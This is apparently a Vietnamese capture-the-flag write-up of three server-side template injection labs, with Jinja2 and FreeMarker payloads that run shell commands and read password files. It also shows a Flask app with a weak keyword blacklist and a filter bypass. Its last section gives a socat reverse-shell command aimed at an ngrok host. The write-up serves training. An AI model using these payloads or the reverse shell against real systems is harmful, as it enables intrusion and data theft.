# Trần Mạnh Huy

* [Python - Server-side Template Injection Introduction](#python---server-side-template-injection-introduction)
* [Java - Server-side Template Injection](#java---server-side-template-injection)
* [Python - Blind SSTI Filters Bypass](#python---blind-ssti-filters-bypass)


## Python - Server-side Template Injection Introduction

```
Statement

This service allows you to generate a web page. Use it to read the flag!

```

#### Đễ thấy ứng dụng nhận vào hai tham số trong đó giá trị content gặp phải lỗ hổng SSTI, thử với payload **{{10*10}}** trong phần content được server trả về kết quả: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_01.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_02.jpg)

Do kết quả trả về là "10101010101010101010" nên có thể xác nhận template được dùng ở đây là jinja2, còn nếu trả về 100 thì sẽ là template twig.

#### Đã xác định được template là jinja2, ta có thể build được payload khai thác từ nó
Dùng TemplateReference object để import các module bằng payload:

```
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('ls').read() }}

```
Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_03.jpg)

#### Thay payload trên bằng {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('ls -lsa').read() }}

Thấy được file .passwd. Sửa payload thành : **{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat .passwd').read() }}** ta được pass để giải chall này

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_04.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_06.jpg)


## Java - Server-side Template Injection

```
Statement

Exploit the vulnerability in order to retrieve the validation password in the file SECRET_FLAG.txt.

```

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_01.jpg)

Sau khi thử test 1 hồi thì thấy nó bị dính SSTI thông qua payloads:${7*7} 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_02.jpg)

Để ý kĩ gì khi thực hiện request GET lên server, phần HEADER của template đang kh chuẩn khi X-Powered-By cho ta biết được website đang dùng tempalte Freemaker hoặc ta có thể thử tiếp khi biết nó bị dính payloads: ${7*7} 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root_02_05.jpg)

Biết được dùng template engine Freemaker rồi thì ta có thể built payload khác thác từ nó như sau:

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

```
Dùng payload tìm flag: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_03.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_04.jpg)



## Python - Blind SSTI Filters Bypass

```
Statement

This company’s site offers to apply for their private bug bounty program. To show them that you are the right candidate for them, exploit this app and find a way to get the flag!

```

Chall này ta có source code: 

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Podalirius

import jinja2
from flask import Flask, flash, redirect, render_template, request, session, abort

mail = """
Hello team,

A new hacker wants to join our private Bug bounty program! Mary, can you schedule an interview?

 - Name: {{ hacker_name }}
 - Surname: {{ hacker_surname }}
 - Email: {{ hacker_email }}
 - Birth date: {{ hacker_bday }}

I'm sending you the details of the application in the attached CSV file:

 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'

Best regards,
"""

def sendmail(address, content):
    try:
        content += "\n\n{{ signature }}"
        _signature = """---\n<b>Offsec Team</b>\noffsecteam@hackorp.com"""
        content = jinja2.Template(content).render(signature=_signature)
    except Exception as e:
        pass
    return None

def sanitize(value):
    blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']
    for word in blacklist:
        if word in value:
            value = value.replace(word,'')
    if any([bool(w in value) for w in blacklist]):
        value = sanitize(value)
    return value

app = Flask(__name__, template_folder="./templates/", static_folder="./static/")
app.config['DEBUG'] = False

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")

@app.route("/", methods=['GET','POST'])
def register():
    global mail
    if request.method == "POST":
        if "name" in request.form.keys() and len(request.form["name"]) != 0 and "surname" in request.form.keys() and len(request.form["surname"]) != 0 and "email" in request.form.keys() and len(request.form["email"]) != 0 and "bday" in request.form.keys() and len(request.form["bday"]) != 0 :
            if len(request.form["name"]) > 20:
                return render_template("index.html", error="Field 'name' is too long.")
            if len(request.form["surname"]) >= 50:
                return render_template("index.html", error="Field 'surname' is too long.")
            if len(request.form["email"]) >= 50:
                return render_template("index.html", error="Field 'email' is too long.")
            if len(request.form["bday"]) > 10:
                return render_template("index.html", error="Field 'bday' is too long.")
            try:
                register_mail = jinja2.Template(mail).render(
                    hacker_name=sanitize(request.form["name"]),
                    hacker_surname=sanitize(request.form["surname"]),
                    hacker_email=sanitize(request.form["email"]),
                    hacker_bday=sanitize(request.form["bday"])
                )
            except Exception as e:
                pass
            sendmail("offsecteam@hackorp.com", register_mail)
            return render_template("index.html", success="Thank you! Your application will be reviewed within a week.")
        else:
            return render_template("index.html", error="Missing fields in the application form!")
    elif request.method == 'GET':
        return render_template("index.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=59073)

```

#### Đầu tiên là template engine được sử dụng là jinja2. Có thể thấy form cho ta 4 tham số nhập: Name, Surface, Email address, Birth day. Và được pass qua santized() và có giới hạn độ dài:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_01.jpg)

Ngoài ra còn có blacklist:

```
blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']

```

Tuy vậy phân tích source code có thể nhận thấy rằng có 1 lỗ hổng có thể bypass qua hàm santized():

```
I'm sending you the details of the application in the attached CSV file:

 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'
 
 ```
 
Bằng việc tách payload SSTI để bypass của hàm santized sau đó khi qua thì chúng sẽ được nối lại với nhau và thực hiện được trong template engine.
Ta thực hiệ tách như sau:  

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab03_02.jpg)
 
Nhưng vì đây là blind SSTI, ta có thể thực hiện revershell đến ngrok của mình host.

> https://www.revshells.com/ : socat TCP:0.tcp.ap.ngrok.io:11193 EXEC:sh

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab03_03.jpg)

Lấy flag: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab03_04.jpg)

